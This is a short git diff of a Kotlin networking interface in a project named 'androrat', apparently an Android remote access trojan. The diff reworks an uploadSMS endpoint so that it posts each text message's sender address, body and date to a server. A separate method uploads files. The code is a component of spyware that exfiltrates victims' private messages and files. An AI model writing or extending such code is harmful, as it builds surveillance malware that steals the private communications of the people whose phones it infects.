@@ -1,11 +1,12 @@
 package com.ierusalem.androrat.core.data.networking
 
 import okhttp3.MultipartBody
-import okhttp3.RequestBody
 import okhttp3.ResponseBody
 import retrofit2.Response
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
+import retrofit2.http.Field
+import retrofit2.http.FormUrlEncoded
 import retrofit2.http.Multipart
 import retrofit2.http.POST
 import retrofit2.http.Part
@@ -17,10 +18,12 @@ interface ApiService {
         @Part file: MultipartBody.Part
     ): Response<ResponseBody>
 
-    @Multipart
+    @FormUrlEncoded
     @POST("sms")
     suspend fun uploadSMS(
-        @Part("sms") sms: RequestBody
+        @Field("address") address: String,
+        @Field("body") body: String,
+        @Field("date") date: String
     ): Response<ResponseBody>
 }
 
